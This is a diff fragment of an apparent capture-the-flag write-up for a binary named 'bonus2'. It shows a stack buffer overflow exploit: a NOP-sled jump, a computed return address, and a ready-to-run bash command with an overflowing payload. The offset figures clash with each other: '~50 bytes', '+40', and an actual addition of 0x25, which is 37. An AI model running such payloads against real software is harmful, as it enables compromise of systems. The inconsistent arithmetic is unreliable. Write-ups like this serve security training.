@@ -85,13 +85,11 @@ eax            0xbffffeb9       -1073742151
 
 
 
-Address: `0xbffffeb8`.
 3. **Execute:**
 I constructed the payload to jump into the middle of my NOP sled (adding ~50 bytes to the address to be safe).
 * Arg 1: 40 'A's.
 we choose a arbitrary +40 to land in the middle of the NOP sled.
 * Arg 2: 23 'B's + Address (`0xbffffeb9` + 40). so 0xbffffeb9+0x25=0xbffffee1 because 0xb9 + 0x25 = 0xE1
-
 
 ```bash
 ./bonus2 $(python -c 'print "A"*40') $(python -c 'print "B"*23 + "\xe1\xfe\xff\xbf"')
